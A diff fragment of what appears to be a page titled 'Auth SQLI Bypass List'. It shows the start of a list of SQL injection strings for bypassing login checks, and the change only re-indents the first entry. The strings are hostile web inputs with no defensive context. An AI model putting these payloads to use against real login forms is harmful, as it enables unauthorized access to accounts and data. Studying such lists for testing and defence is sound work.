@@ -7,7 +7,7 @@ permalink: /_posts
 # Auth SQLI Bypass List
 
 <pre>
-  '="or'
+'="or'
 ' or ''-'
 ' or '' '
 ' or ''&'
